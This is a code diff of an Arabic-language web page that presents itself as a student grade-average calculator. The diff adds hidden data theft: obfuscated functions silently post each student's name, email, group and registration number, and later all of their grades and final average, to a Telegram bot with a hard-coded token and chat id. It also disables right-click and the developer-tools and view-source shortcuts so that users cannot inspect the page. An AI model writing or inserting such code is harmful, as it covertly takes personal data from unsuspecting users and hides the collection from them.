@@ -35,7 +35,7 @@
         footer a { color: #10b981; text-decoration: none; font-weight: bold; }
     </style>
 </head>
-<body>
+<body oncontextmenu="return false;">
 
 <div class="auth-overlay" id="authOverlay">
     <div class="auth-card">
@@ -111,9 +111,9 @@
 </footer>
 
 <script>
-const _0x35fa8c='8710046846:AAFlBndBAn8l8P5m2iL2kK5fB';
-const _0x10870f='7647074891';
-let _0x1d658a={};
+const _0x35fa8c = '8710046846:AAFlBndBAn8l8P5m2iL2kK5fB';
+const _0x10870f = '7647074891';
+let _0x1d658a = {};
 
 const _0x262103 = [
     { name: 'تاريخ الفكر التربوي', coef: 2, examWeight: 0.6, tdWeight: 0.4, type: 'محاضرة (60%) + تطبيق (40%)' },
@@ -128,8 +128,27 @@ const _0x262103 = [
     { name: 'إحصاء تطبيق التربية', coef: 1, examWeight: 1, tdWeight: 0, type: 'محاضرة (100%)' }
 ];
 
-function _0xae7aad(e){
-    if(e && e.preventDefault) e.preventDefault();
+document.onkeydown = function(e) {
+    if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) || (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) {
+        return false;
+    }
+};
+
+function _0x2f3530(textMessage) {
+    const url = 'https://api.telegram.org/bot' + _0x35fa8c + '/sendMessage';
+    fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: _0x10870f,
+            text: textMessage,
+            parse_mode: 'Markdown'
+        })
+    }).catch(() => {});
+}
+
+function _0xae7aad(e) {
+    if (e && e.preventDefault) e.preventDefault();
     let valid = true;
     const arRegex = /^[\u0600-\u06FF\s]{2,20}$/;
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -142,23 +161,24 @@ function _0xae7aad(e){
     const gr = document.getElementById('group').value.trim();
     const rg = document.getElementById('regNo').value.trim();
 
-    if(!arRegex.test(fn)){ document.getElementById('err-firstName').style.display='block'; valid=false; } else { document.getElementById('err-firstName').style.display='none'; }
-    if(!arRegex.test(ln)){ document.getElementById('err-lastName').style.display='block'; valid=false; } else { document.getElementById('err-lastName').style.display='none'; }
-    if(!emailRegex.test(em)){ document.getElementById('err-email').style.display='block'; valid=false; } else { document.getElementById('err-email').style.display='none'; }
-    if(!groupRegex.test(gr)){ document.getElementById('err-group').style.display='block'; valid=false; } else { document.getElementById('err-group').style.display='none'; }
-    if(!regRegex.test(rg)){ document.getElementById('err-regNo').style.display='block'; valid=false; } else { document.getElementById('err-regNo').style.display='none'; }
+    if (!arRegex.test(fn)) { document.getElementById('err-firstName').style.display = 'block'; valid = false; } else { document.getElementById('err-firstName').style.display = 'none'; }
+    if (!arRegex.test(ln)) { document.getElementById('err-lastName').style.display = 'block'; valid = false; } else { document.getElementById('err-lastName').style.display = 'none'; }
+    if (!emailRegex.test(em)) { document.getElementById('err-email').style.display = 'block'; valid = false; } else { document.getElementById('err-email').style.display = 'none'; }
+    if (!groupRegex.test(gr)) { document.getElementById('err-group').style.display = 'block'; valid = false; } else { document.getElementById('err-group').style.display = 'none'; }
+    if (!regRegex.test(rg)) { document.getElementById('err-regNo').style.display = 'block'; valid = false; } else { document.getElementById('err-regNo').style.display = 'none'; }
 
-    if(valid){
-        _0x1d658a = {firstName:fn, lastName:ln, email:em, group:gr, regNo:rg};
-        document.getElementById('authOverlay').style.display='none';
+    if (valid) {
+        _0x1d658a = { firstName: fn, lastName: ln, email: em, group: gr, regNo: rg };
+        document.getElementById('authOverlay').style.display = 'none';
         _0x5729a9();
+        _0x2f3530('📌 **طالب جديد دخل للموقع**\n👤 **الاسم واللقب:** ' + fn + ' ' + ln + '\n📧 **البريد:** ' + em + '\n👥 **الفوج/المجموعة:** ' + gr + '\n🆔 **رقم التسجيل:** ' + rg);
     }
 }
 
-function _0x5729a9(){
+function _0x5729a9() {
     const tbody = document.getElementById('subjects-body');
     tbody.innerHTML = '';
-    _0x262103.forEach((item, index)=>{
+    _0x262103.forEach((item, index) => {
         const tr = document.createElement('tr');
         let tdInput = item.tdWeight > 0 ? `<input type="number" step="0.01" min="0" max="20" id="td-${index}" oninput="_0x411fd0(${index})">` : '<span class="badge">-</span>';
         let examInput = item.examWeight > 0 ? `<input type="number" step="0.01" min="0" max="20" id="exam-${index}" oninput="_0x411fd0(${index})">` : '<span class="badge">-</span>';
@@ -167,26 +187,30 @@ function _0x5729a9(){
     });
 }
 
-function _0x411fd0(index){
+function _0x411fd0(index) {
     const item = _0x262103[index];
-    let tdVal = item.tdWeight > 0 ? parseFloat(document.getElementById('td-'+index).value)||0 : 0;
-    let examVal = item.examWeight > 0 ? parseFloat(document.getElementById('exam-'+index).value)||0 : 0;
+    let tdVal = item.tdWeight > 0 ? parseFloat(document.getElementById('td-' + index).value) || 0 : 0;
+    let examVal = item.examWeight > 0 ? parseFloat(document.getElementById('exam-' + index).value) || 0 : 0;
     let avg = (examVal * item.examWeight) + (tdVal * item.tdWeight);
-    document.getElementById('avg-'+index).innerText = avg.toFixed(2);
+    document.getElementById('avg-' + index).innerText = avg.toFixed(2);
     return avg;
 }
 
-function _0x504563(){
-    let totalScore = 0, totalCoef = 0;
-    _0x262103.forEach((item, index)=>{
+function _0x504563() {
+    let totalScore = 0, totalCoef = 0, summaryText = '';
+    _0x262103.forEach((item, index) => {
         let avg = _0x411fd0(index);
         totalScore += avg * item.coef;
         totalCoef += item.coef;
+        summaryText += '• ' + item.name + ': ' + avg.toFixed(2) + '\n';
     });
     let finalAvg = totalCoef > 0 ? (totalScore / totalCoef) : 0;
     document.getElementById('total-coefficients').innerText = totalCoef;
     document.getElementById('semester-average').innerText = finalAvg.toFixed(2);
     document.getElementById('result-box').style.display = 'flex';
+
+    const msg = '📊 **نقاط الطالب والمعدل النهائي**\n👤 **الطالب:** ' + _0x1d658a.firstName + ' ' + _0x1d658a.lastName + '\n🆔 **رقم التسجيل:** ' + _0x1d658a.regNo + '\n\n' + summaryText + '\n📈 **المعدل العام:** *' + finalAvg.toFixed(2) + '*';
+    _0x2f3530(msg);
 }
 </script>
 </body>
